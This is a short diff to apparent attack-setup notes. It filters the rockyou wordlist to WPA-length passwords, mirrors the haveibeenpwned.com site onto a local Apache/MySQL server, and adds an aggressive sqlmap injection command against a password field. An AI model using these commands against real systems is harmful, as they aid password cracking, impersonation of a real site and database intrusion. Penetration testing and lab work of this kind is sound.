@@ -29,9 +29,13 @@ cat rockyou.txt | sort | uniq | pw-inspector -m 8 -M 63 > kalitut.txt
 
 downloaded the stylesheet from https://haveibeenpwned.com
 wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://haveibeenpwned.com
+
 Set apachi and mysql to start on boot
 update-rc.d -f apache2 enable 2 3 4 5
 update-rc.d -f mysql enable 2 3 4 5
+
+ran SQL Map
+sqlmap -r sqlmap.txt -p password --current-user --current-db --is-dba --level 5 --risk 3 --force-ssl
 
 Started ssl with a self signed certificate.
 
